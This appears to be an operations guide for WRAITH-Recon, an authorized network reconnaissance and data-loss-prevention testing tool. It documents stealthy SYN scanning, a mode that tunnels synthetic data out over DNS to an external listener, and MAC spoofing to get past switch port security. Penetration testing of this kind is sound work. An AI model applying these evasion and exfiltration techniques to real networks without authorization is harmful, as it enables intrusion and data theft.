# WRAITH-Recon Operations Guide

**Document Version:** 1.0.0
**Last Updated:** 2025-11-29

---

## 1. Pre-Engagement Setup

### 1.1 Authorization & Scoping
Before deploying WRAITH-Recon, you **MUST** generate a signed governance file.
1.  Define the Scope (CIDRs, Domains).
2.  Define the Engagement Window (Start/End dates).
3.  Sign the configuration using the offline CA key:
    ```bash
    wraith-recon-signer sign --config engagement.toml --key private.pem --out scope.sig
    ```

### 1.2 Infrastructure
*   **Listener Node:** If testing exfiltration, set up a listener on an external VPS (AWS/Azure/DigitalOcean) running `wraith-server --mode listener`.
*   **Operator Machine:** Ensure the machine running `wraith-recon` has a NIC that supports AF_XDP (most modern Intel/Mellanox cards) and is running Linux Kernel 6.2+.

---

## 2. Deployment Modes

### 2.1 Mode: Passive Scout (Silent)
*   **Command:** `sudo wraith-recon --config scope.sig --mode passive --interface eth0`
*   **Behavior:**
    *   Promiscuous mode enabled.
    *   **NO** packets transmitted.
    *   TUI displays discovered hosts.
    *   Logs saved to `session_{timestamp}.pcap` and `findings.json`.

### 2.2 Mode: Active Mapper (Stealth)
*   **Command:** `sudo wraith-recon --config scope.sig --mode active --profile stealth`
*   **Behavior:**
    *   Sends SYN probes to discovered hosts.
    *   Uses high-jitter timing (1 probe per 1-5 seconds per host).
    *   Maps open ports and services.

### 2.3 Mode: Exfiltration Simulator
*   **Command:** `sudo wraith-recon --config scope.sig --mode exfil --target [LISTENER_IP] --strategy dns`
*   **Behavior:**
    *   Generates synthetic PII data.
    *   Attempts to tunnel data to the listener via DNS queries.
    *   Reports throughput and block rate.

---

## 3. Interpretation of Results

### 3.1 Findings Dashboard
*   **Green Nodes:** Hosts confirmed accessible.
*   **Red Nodes:** Hosts detected but blocked by firewall.
*   **Blue Links:** Detected traffic paths.

### 3.2 DLP Report
*   **Blocked:** Data transfer failed (connection reset, timeout, or 0 throughput).
*   **Throttled:** Data transferred but at < 10% of requested speed (Traffic Shaping detected).
*   **Bypassed:** Data transferred successfully at requested speed.

---

## 4. Troubleshooting

### 4.1 "AF_XDP Init Failed"
*   **Cause:** Kernel version too old or NIC driver incompatibility.
*   **Fix:** Update kernel to 6.2+ or use `--driver generic` (slower, copies packets).

### 4.2 "Governance Verification Failed"
*   **Cause:** `scope.sig` is corrupt, expired, or signed by the wrong key.
*   **Fix:** Regenerate signature with correct CA key. Check system clock.

### 4.3 "Link Detected but No Traffic"
*   **Cause:** Upstream switch port security (MAC filtering) or heavy firewalling.
*   **Fix:** Enable `--spoof-mac` to mimic a legitimate device on the segment (requires knowing a valid MAC).
